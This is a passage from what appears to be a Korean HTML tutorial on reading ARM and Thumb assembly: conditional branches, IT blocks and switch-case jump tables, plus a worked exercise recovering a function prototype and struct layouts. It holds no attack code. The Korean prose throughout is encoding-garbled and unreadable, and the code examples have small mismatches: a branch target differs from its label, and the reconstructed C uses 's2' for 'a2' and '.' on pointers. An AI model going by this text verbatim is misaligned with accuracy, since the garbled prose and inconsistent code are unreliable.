ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. <code>CBZ</code> ëŠ” ë ˆì§€ìŠ¤í„° <code>Rn</code> ì˜ ê°’ì´ 0ì´ë©´ <code>label</code> ë¡œ ë¶„ê¸°í•˜ê³ , <code>CBNZ</code> ëŠ” 0ì´ ì•„ë‹ˆë©´ ë¶„ê¸°í•©ë‹ˆë‹¤. ì´ë“¤ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì£¼ë¡œ ì •ìˆ˜í˜• ë³€ìˆ˜ì˜ ê°’ì´ 0ì¸ì§€, ë˜ëŠ” í¬ì¸í„°ê°€ <code>NULL</code> ì¸ì§€ ê²€ì‚¬í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CBZ</span> Rn, label</span><br><span class="line"><span class="keyword">CBNZ</span> Rn, label</span><br></pre></td></tr></table></figure><p>ë‹¤ìŒì€ í•¨ìˆ˜ê°€ ë°˜í™˜í•œ í¬ì¸í„°ê°€ <code>NULL</code> ì¸ì§€ ê²€ì‚¬í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BL</span> foo              <span class="comment">; í•¨ìˆ˜ fooëŠ” í¬ì¸í„°ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R0</span>, loc_100BC8E</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_100BCE:</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="keyword">B</span> locret_100BCE4</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">locret_100BCE4:</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R3</span>-<span class="built_in">R8</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = foo(...);</span><br><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure><p>ë¶„ê¸° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>B</code> ì— ì¡°ê±´ ì ‘ë¯¸ì‚¬ë¥¼ ë¶™ì´ë©´ (e.g. <code>BEQ</code> , <code>BLE</code> , <code>BLT</code> , <code>BLS</code>) ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ì˜ ARM ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ëŠ” ì¡°ê±´ ì ‘ë¯¸ì‚¬ë¥¼ ë¶™ì—¬ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë©°, ì¡°ê±´ì´ ì°¸ì´ ì•„ë‹Œ ê²½ìš° ê·¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>NOP</code> ì™€ ê°™ì´ ì·¨ê¸‰í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ê±´ë¶€ ì‹¤í–‰ì€ ë¶„ê¸°ì— í•„ìš”í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ìˆ˜ë¥¼ ì¤„ì´ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ í¬ì¸í„°ê°€ <code>NULL</code> ì´ ì•„ë‹Œ ê²½ìš° êµ¬ì¡°ì²´ì˜ íŠ¹ì • í•„ë“œë¥¼ ë°˜í™˜í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">LDRNEB</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>,<span class="number">#0x48</span>]</span><br><span class="line"><span class="keyword">BX</span> <span class="built_in">LR</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">return</span> a-&gt;off_48; &#125;</span><br></pre></td></tr></table></figure><h3 id="thumb-%EC%83%81%ED%83%9C%EC%97%90%EC%84%9C%EC%9D%98-%EC%A1%B0%EA%B1%B4%EB%B6%80-%EC%8B%A4%ED%96%89" tabindex="-1">Thumb ìƒíƒœì—ì„œì˜ ì¡°ê±´ë¶€ ì‹¤í–‰</h3><p>Thumb ìƒíƒœì—ì„œëŠ” <code>IT</code> (if-then) ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ì•¼ë§Œ ì¡°ê±´ë¶€ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. (<code>B</code> ëŠ” ì˜ˆì™¸ì…ë‹ˆë‹¤)</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">ITxyz</span> cc</span><br></pre></td></tr></table></figure><p><code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë’¤ë”°ë¥´ëŠ” ìµœëŒ€ 4ê°œì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ê¹Œì§€ ì¡°ê±´ë¶€ë¡œ ì‹¤í–‰ë  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. <code>cc</code> ëŠ” ì²«ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì‹¤í–‰ ì¡°ê±´ì´ë©°, <code>x</code> , <code>y</code> , <code>z</code> ëŠ” ê°ê° ë‘˜ì§¸, ì…‹ì§¸, ë„·ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì¡°ê±´ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ 3ê°œì˜ ì¡°ê±´ì€ <code>T</code> ë˜ëŠ” <code>E</code> ë¡œë§Œ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>T</code> - <code>cc</code> ê°€ ì°¸ì´ë©´ ì‹¤í–‰í•©ë‹ˆë‹¤.</li><li><code>E</code> - <code>cc</code> ê°€ ê±°ì§“ì´ë©´ ì‹¤í–‰í•©ë‹ˆë‹¤.</li></ul><p>ë‹¤ìŒì€ if-else ë¸”ë¡ì„ <code>IT</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì‘ì„±í•œ ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R3</span>, <span class="number">#0</span>          <span class="comment">; ë¹„êµ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ, CPSRì„ ê°±ì‹ í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">ITEE</span> NE             <span class="comment">; IT ë¸”ë¡ì„ ì‹œì‘í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">CLZNE.W</span> <span class="built_in">R0</span>, <span class="built_in">R12</span>     <span class="comment">; ì²«ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ë¹„êµì˜ ê²°ê³¼ NE ì¡°ê±´ì´ ì°¸ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">CLZEQ.W</span> <span class="built_in">R0</span>, <span class="built_in">R6</span>      <span class="comment">; ë‘˜ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ NE ì¡°ê±´ì´ ê±°ì§“ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">ADDEQ</span> <span class="built_in">R0</span>, <span class="number">#0x20</span>     <span class="comment">; ì…‹ì§¸ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ NE ì¡°ê±´ì´ ê±°ì§“ì´ë©´ ì‹¤í–‰ë©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 != <span class="number">0</span>) &#123;</span><br><span class="line">    R0 = countleadzeros(R12);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    R0 = countleadzeros(R6);</span><br><span class="line">    R0 += <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch-case-%EA%B5%AC%EB%AC%B8" tabindex="-1">Switch-case êµ¬ë¬¸</h3><p>Switch-case êµ¬ë¬¸ì€ ì—¬ëŸ¬ ë¬¶ìŒì˜ if-else ë¸”ë¡ê³¼ ê°™ìŠµë‹ˆë‹¤. ì»´íŒŒì¼ ì‹œì ì— ê° case ë¸”ë¡ì˜ ìœ„ì¹˜ë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì»´íŒŒì¼ëŸ¬ëŠ” ì í”„ í…Œì´ë¸”ì„ ìƒì„±í•˜ì—¬ switch-case êµ¬ë¬¸ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì— ê° case ë¸”ë¡ì˜ ì£¼ì†Œë¥¼, Thumb ìƒíƒœì—ì„œëŠ” ë¸”ë¡ì˜ ì˜¤í”„ì…‹ì„ ì €ì¥í•©ë‹ˆë‹¤. ëŸ°íƒ€ì„ì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì„ ì½ê³  ëª©ì ì§€ ì£¼ì†Œë¥¼ <code>PC</code> ë¡œ ë¶ˆëŸ¬ë“¤ì´ëŠ” ê°„ì ‘ ë¶„ê¸°(indirect branch)ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ ARM ìƒíƒœì—ì„œ switch-case êµ¬ë¬¸ì˜ ì˜ˆì œì…ë‹ˆë‹¤. ARM ìƒíƒœì—ì„œ ê°„ì ‘ ë¶„ê¸°ëŠ” <code>PC</code> ë¥¼ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ë¡œ í•˜ëŠ” <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1ì´ caseì¸ë°, ì í”„ í…Œì´ë¸”ì˜ ë²”ìœ„ ì•ˆì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">LDRLS</span> <span class="built_in">PC</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>,LSL<span class="number">#2</span>]      <span class="comment">; ë²”ìœ„ ì•ˆì— ìˆìœ¼ë©´ ì í”„ í…Œì´ë¸”ì„ ì½ê³  PCì— ëŒ€ì…í•˜ì—¬ ë¶„ê¸°í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">B</span> loc_DD10                  <span class="comment">; ë²”ìœ„ ì•ˆì— ì—†ìœ¼ë©´ breakí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C                <span class="comment">; ì í”„ í…Œì´ë¸”ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD4C</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; ì¸ë±ìŠ¤ 8 (case 8ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; ì¸ë±ìŠ¤ 9 (case 9ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_DCEC:</span>                   <span class="comment">; case 8, 9ì— í•´ë‹¹í•˜ëŠ” ì½”ë“œ ë¸”ë¡ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">R1</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R2</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="keyword">STRH</span> <span class="built_in">R3</span>, [<span class="built_in">R2</span>,<span class="number">#0x1c</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R1</span>, [<span class="built_in">R2</span>,<span class="number">#0x10</span>]</span><br></pre></td></tr></table></figure><p>Thumb ìƒíƒœì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì— case ë¸”ë¡ì˜ ì£¼ì†Œê°€ ì•„ë‹Œ ì˜¤í”„ì…‹ì„ ë³´ê´€í•©ë‹ˆë‹¤. ê°„ì ‘ ë¶„ê¸°ëŠ” íŠ¹ìˆ˜í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>TBB</code> ì™€ <code>TBH</code> ë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, ì í”„ í…Œì´ë¸”ì˜ ê°’ì— 2ë¥¼ ê³±í•˜ê³  <code>PC</code> ì— ë”í•˜ì—¬ case ë¸”ë¡ì˜ ì£¼ì†Œë¥¼ ì–»ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1ì´ caseì¸ë°, ì í”„ í…Œì´ë¸”ì˜ ë²”ìœ„ ì•ˆì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">BHI</span> loc_101E6F2             <span class="comment">; ë²”ìœ„ ì•ˆì— ì—†ìœ¼ë©´ breakí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R6</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">TBB.W</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>]               <span class="comment">; ì í”„ í…Œì´ë¸”ì„ ì½ê³  ë¶„ê¸°í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span>                       <span class="comment">; ì í”„ í…Œì´ë¸”ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0xf</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; ì¸ë±ìŠ¤ 8 (case 8ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; ì¸ë±ìŠ¤ 9 (case 9ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_101E6E4:</span>                <span class="comment">; case 8, 9ì— í•´ë‹¹í•˜ëŠ” ì½”ë“œ ë¸”ë¡ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">SUBS.W</span> <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R4</span>,<span class="number">#0x14</span>]</span><br></pre></td></tr></table></figure><h2 id="%EB%A6%AC%EB%B2%84%EC%8A%A4-%EC%97%94%EC%A7%80%EB%8B%88%EC%96%B4%EB%A7%81-%EC%97%B0%EC%8A%B5" tabindex="-1">ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ ì—°ìŠµ</h2><p>ì§€ê¸ˆê¹Œì§€ ì‚´í´ë³¸ ë‚´ìš©ì„ ë°”íƒ•ìœ¼ë¡œ, ì˜ˆì œ í•¨ìˆ˜ë¥¼ ì§ì ‘ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§í•´ë³´ë©´ì„œ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤. í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìœ¼ë©°, í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ê·¸ë˜í”„ë¡œ ë‚˜íƒ€ë‚´ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x5c</span>]</span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x58</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="keyword">BL</span> unk_function</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/6.png" alt="6.png"></p><p>ë‹¤ìŒì€ í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ë³´ê³  ë¹ ë¥´ê²Œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì‚¬ì‹¤ë“¤ì…ë‹ˆë‹¤.</p><ul><li>í•¨ìˆ˜ëŠ” ìµœëŒ€ 4ê°œì˜ ì¸ìë¥¼ ë°›ê³ , ë¶ˆë¦¬ì–¸í˜•ì„ ë¦¬í„´í•©ë‹ˆë‹¤.<ul><li>í•¨ìˆ˜ í˜¸ì¶œ ì½”ë“œì—ì„œ <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> ì— ê°’ì„ ëŒ€ì…í•˜ê³ , í•¨ìˆ˜ì˜ ë¦¬í„´ ì§ì „ <code>R0</code> ì— ëŒ€ì…ë˜ëŠ” ê°’ì€ 0 ì•„ë‹ˆë©´ 1ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤</li></ul></li><li>ì²«ë²ˆì§¸, ë‘ë²ˆì§¸ ì¸ìëŠ” êµ¬ì¡°ì²´ì˜ í¬ì¸í„°ë¼ê³  ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>3í–‰, 4í–‰ ë“±ì—ì„œ <code>R0</code> ê³¼ <code>R1</code> ì´ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ë² ì´ìŠ¤ ì£¼ì†Œë¡œ ì‚¬ìš©ë˜ë©°, ìƒìˆ˜ ì˜¤í”„ì…‹ì— ì ‘ê·¼í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</li></ul></li><li>ì„¸ë²ˆì§¸, ë„¤ë²ˆì§¸ ì¸ìì˜ ìë£Œí˜•ì€ ì •ìˆ˜ì…ë‹ˆë‹¤.<ul><li>14í–‰, 15í–‰ì—ì„œ <code>AND</code> , <code>ORR</code> ì—°ì‚°ì˜ ì¸ìë¡œ ì‚¬ìš©ë˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</li></ul></li></ul><p>ì´ë¥¼ ë°”íƒ•ìœ¼ë¡œ í•¨ìˆ˜ì˜ í”„ë¡œí† íƒ€ì…ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *, struct2 *, <span class="type">int</span>, <span class="type">int</span>)</span></span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œëŠ” ì‹ë³„ëœ êµ¬ì¡°ì²´ë“¤ì˜ í˜•íƒœë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><ul><li>3~6í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #8]</code> ê³¼ <code>struct2</code> ì˜ <code>[R1, #0x18]</code> ì„ ë¹„êµí•˜ê³  ìˆìŠµë‹ˆë‹¤.<ul><li>ë‘ í•„ë“œëŠ” ë™ì¼í•œ íƒ€ì…ì´ê³ , ì •ìˆ˜í˜•ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>8í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #0x10]</code> ì„ ì½ê³  2ì™€ ë¹„êµí•˜ëŠ”ë°, <code>LDRH</code> (load half word) ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•˜ê³  ìˆì–´ <code>short</code> íƒ€ì…ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>11~14í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #0x18]</code> . <code>[R0, #0x1c]</code> ì„ ì½ê³  ê°ê° ì„¸ë²ˆì§¸, ë„¤ë²ˆì§¸ ì¸ìì™€ <code>AND</code> ì—°ì‚°ì„ í•˜ê³  ìˆì–´ í•„ë“œì˜ íƒ€ì…ì´ ì •ìˆ˜í˜•ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    unk8;          <span class="comment">// +0x8 ; struct2.unk18ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>16í–‰ê¹Œì§€ ë¶„ì„í•œ ë‚´ìš©ì„ C ì½”ë“œë¡œ ë‚˜íƒ€ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´í›„ì˜ ì½”ë“œë¥¼ ê³„ì† ë¶„ì„í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><ul><li>17í–‰ì€ <code>struct1</code> ì˜ <code>[R0, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•˜ê³ , 18í–‰ì€ <code>[R0]</code> ì„ <code>R0</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li><li>19í–‰ì€ <code>R3 + (R3 &lt;&lt; 1)</code> ì„ <code>R2</code> ì— ëŒ€ì…í•˜ëŠ”ë°, ì´ëŠ” ê³§ <code>R3 * 3</code> ì…ë‹ˆë‹¤.</li><li>20í–‰ì€ <code>struct2</code> ì˜  <code>[R1, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•˜ê³ , 21í–‰ì€ ë‹¤ì‹œ <code>[R3, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.<ul><li><code>struct2</code> ì˜ ì˜¤í”„ì…‹ <code>0xc</code> ì— ìœ„ì¹˜í•œ í•„ë“œëŠ” ë‹¤ë¥¸ êµ¬ì¡°ì²´ë¡œì˜ í¬ì¸í„°ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>22í–‰ì€ <code>R3 + R2 * 8</code> ì„ <code>R3</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li><li>23í–‰ì€ <code>[R3, #0x16]</code> ì˜ ë°”ì´íŠ¸ ê°’ì„ <code>LDRSB</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ <code>R4</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> unk0;       <span class="comment">// +0x0</span></span><br><span class="line">    unk8;           <span class="comment">// +0x8 ; struct2.unk18ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">    <span class="type">int</span> unkc;       <span class="comment">// +0xc</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    struct3 *unkc;  <span class="comment">// +0xc</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 